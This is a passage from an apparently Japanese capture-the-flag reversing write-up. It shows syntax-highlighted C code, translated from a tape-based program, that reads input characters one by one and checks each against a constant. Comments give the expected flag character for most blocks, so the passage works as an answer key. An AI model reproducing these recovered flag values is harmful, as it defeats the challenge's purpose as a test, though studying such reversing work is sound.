    ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">98</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        ptr <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>


<span class="token comment">// chr(145-10*5)</span>
    tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    ptr <span class="token operator">+=</span> <span class="token number">2</span><span class="token punctuation">;</span>
    tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">10</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">5</span><span class="token punctuation">;</span>
        ptr <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        ptr <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">145</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        ptr <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>


<span class="token comment">// chr(125-10*7)</span>
    tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    ptr <span class="token operator">+=</span> <span class="token number">2</span><span class="token punctuation">;</span>
    tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">10</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">7</span><span class="token punctuation">;</span>
        ptr <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        ptr <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">125</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        ptr <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>


<span class="token comment">// chr(170-10*7)</span>
    tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    ptr <span class="token operator">+=</span> <span class="token number">2</span><span class="token punctuation">;</span>
    tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">10</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">7</span><span class="token punctuation">;</span>
        ptr <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        ptr <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">170</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        ptr <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>


<span class="token comment">// chr(112-10*6)</span>
    tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    ptr <span class="token operator">+=</span> <span class="token number">2</span><span class="token punctuation">;</span>
    tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">10</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">6</span><span class="token punctuation">;</span>
        ptr <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        ptr <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">112</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        ptr <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>


<span class="token comment">// chr(153-17*3)</span>
    tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    ptr <span class="token operator">+=</span> <span class="token number">2</span><span class="token punctuation">;</span>
    tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">17</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">3</span><span class="token punctuation">;</span>
        ptr <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        ptr <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">153</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        ptr <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>


<span class="token comment">// chr(95-11*4)</span>
    tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    ptr <span class="token operator">+=</span> <span class="token number">2</span><span class="token punctuation">;</span>
    tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">11</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">4</span><span class="token punctuation">;</span>
        ptr <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        ptr <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">95</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        ptr <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>


<span class="token comment">// chr(143-23*2)</span>
    tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    ptr <span class="token operator">+=</span> <span class="token number">2</span><span class="token punctuation">;</span>
    tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">23</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">2</span><span class="token punctuation">;</span>
        ptr <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        ptr <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">143</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        ptr <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>


<span class="token comment">// </span>
    tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    ptr <span class="token operator">+=</span> <span class="token number">2</span><span class="token punctuation">;</span>
    tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">23</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">3</span><span class="token punctuation">;</span>
        ptr <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        ptr <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">118</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        ptr <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>


<span class="token comment">// chr(155-19*3)</span>
    tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    ptr <span class="token operator">+=</span> <span class="token number">2</span><span class="token punctuation">;</span>
    tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">19</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">3</span><span class="token punctuation">;</span>
        ptr <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        ptr <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">155</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        ptr <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>


<span class="token comment">// chr(155-6*5)</span>
    tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    ptr <span class="token operator">+=</span> <span class="token number">2</span><span class="token punctuation">;</span>
    tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">6</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">5</span><span class="token punctuation">;</span>
        ptr <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        ptr <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">155</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        ptr <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span></code></pre></div>
<p>このコード内では、以下のような構造のコードが連続して定義されています。</p>
<p>この中では、入力値の各文字が格納されている <code class="language-text">tape[ptr]</code> に対していくつかの演算を行った後、最終的に <code class="language-text">tape[ptr] -= 138;</code> などの結果が 0 になるかを検証しています。</p>
<div class="gatsby-highlight" data-language="c"><pre class="language-c"><code class="language-c"><span class="token comment">// chr(138-3*11)</span>
tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
ptr <span class="token operator">+=</span> <span class="token number">2</span><span class="token punctuation">;</span>
tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">11</span><span class="token punctuation">;</span>
<span class="token keyword">while</span> <span class="token punctuation">(</span>tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">3</span><span class="token punctuation">;</span>
    ptr <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token keyword">while</span> <span class="token punctuation">(</span>tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    ptr <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">138</span><span class="token punctuation">;</span>
<span class="token keyword">while</span> <span class="token punctuation">(</span>tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    ptr <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
